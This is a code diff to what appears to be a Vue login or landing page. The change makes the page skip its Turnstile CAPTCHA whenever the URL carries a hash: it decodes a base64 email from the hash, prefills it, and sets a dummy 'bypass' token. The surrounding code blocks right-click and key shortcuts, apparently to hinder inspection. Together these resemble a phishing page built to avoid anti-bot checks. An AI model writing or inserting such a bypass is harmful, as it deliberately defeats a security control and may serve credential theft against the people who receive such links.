@@ -58,6 +58,18 @@ let turnstileRendered = false
 
 onMounted(async () => {
   await nextTick()
+
+  // 👇 NEW: Skip CAPTCHA if URL has #email
+  const hash = window.location.hash
+  if (hash && hash.startsWith('#')) {
+    const encodedEmail = hash.slice(1)
+    const decoded = atob(encodedEmail)
+    email.value = decoded
+    captchaToken.value = 'bypass'  // Dummy non-null token to skip CAPTCHA screen
+    return
+  }
+
+  // 👇 Already in your code
   document.addEventListener('contextmenu', e => e.preventDefault())
   document.addEventListener('keydown', e => {
     if (
